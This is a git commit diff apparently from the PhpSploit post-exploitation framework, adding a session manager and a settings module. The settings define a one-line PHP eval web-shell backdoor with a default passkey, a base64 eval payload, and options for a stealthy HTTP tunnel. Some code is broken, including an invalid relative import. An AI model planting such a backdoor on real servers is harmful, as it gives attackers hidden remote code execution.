a150c93066f6fd6bb8572a589482e3dbfa449922
nil0x42 <nil0x42@gmail.com>
2013-04-15 21:40:56 +0200

    some other modifs on session drafts

--- core/session/__init__.py
+++ core/session/__init__.py
@@ -1,8 +1,71 @@
-print('lol')
-import phpserialize
-import colorama
+"""PhpSploit Session Manager
 
-import pprint
-import inspect
-import os
-print(os.path.split(inspect.getfile(inspect.currentframe())))
+When imorted for the first time, the "session" package initializes it
+self as a PhpSploit blank session, with its default values.
+
+"""
+import .settings, .environment
+Conf = settings.Init()
+Env  = environment.Init()
+
+from .pickle import load, dump
+
+
+
+"""BEHAVIOR SIMULATION
+
+>>> import session
+
+
+Setter:
+>>> session.Conf.REQ_INTERVAL = "1-5"
+>>> setattr(session.Conf, 'REQ_INTERVAL', "1-5")
+>>> session.Conf('REQ_INTERVAL', "1-5")
+
+Getter:
+>>> session.Conf.REQ_INTERVAL
+(1.0, 5.0)
+>>> getattr(session.Conf, 'REQ_INTERVAL')
+(1.0, 5.0)
+>>> session.Conf('REQ_INTERVAL')
+(1.0, 5.0)
+
+Checker:
+>>> hasattr(session.Conf, 'REQ_INTERVAL')
+True
+>>> session.Conf('REQ_INTERVAL') is not NotImplemented
+True
+
+Deleter:
+>>> del session.Conf.REQ_INTERVAL
+>>> delattr(session.Conf, 'REQ_INTERVAL')
+
+Caller: # return the dynamic value (Interval types return float between tuple)
+>>> session.Conf.REQ_INTERVAL()
+3.2
+>>> getattr(session.Conf, 'REQ_INTERVAL')()
+4.9
+>>> session.Conf('REQ_INTERVAL')()
+2.1
+
+Nice repr: # return a nice, human readable var type representation
+>>> session.Conf.REQ_INTERVAL.repr
+
+
+self.CNF['ENV']['CWD']
+session.Environment.CWD
+
+
+
+self.CNF['ENV']['CWD']
+session.Env.CWD
+session.Conf.CWD
+session.Alias.CWD
+
+session.Environment.CWD
+session.Settings.CWD
+session.Aliases.CWD
+
+session.Server.HOME
+
+"""
---
+++ core/session/settings.py
@@ -0,0 +1,102 @@
+"""PhpSploit configuration settings.
+
+The settings instance is initialized by the session's __init__.py file,
+as "Conf", ( aka `Conf  = settings.Init()`).
+
+Standard settings behavior:
+  * Considering their internal uses by the core, they are defined and
+    set to their default values at initialization. It also means that
+    unlike environment variables (see environment.py), new settings
+    cannot be created, and existing ones cannot be removed.
+  * However, a few settings can be (and defaultly are) disabled by
+    setting their value to None.
+
+HTTP_* Settings special behavior:
+  * Unlike standard settings, values whose name starts with 'HTTP_' are
+    dynamically used by the PhpSploit network tunnel as HTTP Headers.
+    They can be removed by setting their value to None, and new ones
+    can be created. They take a String as argument, or a multiline
+    string, in which case a random line from it will be picked on each
+    HTTP tunnel request.
+
+"""
+
+from datatypes import *
+import tempfile, webbrowser
+
+class Init:
+    """Phpsploit Settings data descriptor & initializer.
+    This data descriptor obey the conventions defined in the
+    module's docstring.
+
+    * Since the most part of the settings use a phpsploit dedicated
+      data type (datatypes module), their additionnal features are
+      supported, with backward compatibility with python built-in types.
+    * This data descriptor ignores case, and implitly considers any
+      attribute (var name) call as uppercase.
+
+    Restrictions:
+      - Only "[A-Za-z0-9_]" chars are accepted for names
+      - Creation and deletion are prohibited (except for HTTP_*).
+      * Failure to comply them whill raise a ValueError exception.
+
+    WARNING: Acessing a value whose type is a phpsploit special
+    datatype returns the type's call() method instead of it's basic
+    value. It means that "session.Conf.REQ_INTERVAL" return value
+    will be the same as the one returned by REQ_INTERVAL.call(), so
+    it handles types like Interval or RandLine that can return
+    different values.
+    To bypass the behavior mentionned above, the descriptor's __call__
+    method can be used, setting the variable name as argument.
+
+    Example:
+    >>> session.Conf.REQ_INTERVAL # return a dynamic random interval
+    3.2
+    >>> session.Conf('REQ_INTERVAL') # return the wanted object
+    (1.0, 5.0)
+
+    """
+    TMPPATH  = WritableDir( tempfile.gettempdir() )
+    SAVEPATH = WritableDir( tempfile.gettempdir() )
+
+    TARGET   = Url(None)
+    BACKDOOR = PhpCode("@eval($_SERVER['HTTP_%%PASSKEY%%']);")
+    PROXY    = Proxy(None)
+    PASSKEY  = str("phpSpl01t")
+
+    TEXTEDITOR = get_texteditor()
+    WEBBROWSER = Executable( webbrowser.get().name )
+
+    HTTP_USER_AGENT     = RandLine("file://framework/misc/http_user_agents.lst")
+    REQ_DEFAULT_METHOD  = str('GET')
+    REQ_HEADER_PAYLOAD  = PhpCode("eval(base64_decode(%%BASE64%%))")
+    REQ_INTERVAL        = Interval("1 < 10")
+    REQ_MAX_HEADERS     = int(100)
+    REQ_MAX_HEADER_SIZE = ByteSize("4 KiB")
+    REQ_MAX_POST_SIZE   = ByteSize("4 MiB")
+    REQ_ZLIB_TRY_LIMIT  = ByteSize("20 MiB")
+
+
+    def __init__(self):
+        pass
+
+
+
+def get_texteditor():
+    """Try to determine the system's text editor"""
+    from os import environ
+    from sys import platform
+
+    # cross-platform editor handling
+    if 'EDITOR' in environ:
+        editor = environ['EDITOR']
+    elif platform.startswith('win'):
+        editor = "notepad.exe"
+    else:
+        editor = "vi"
+
+    # check if it is a real executable
+    try:
+        return Executable(editor)
+    except ValueError:
+        return Executable(None)
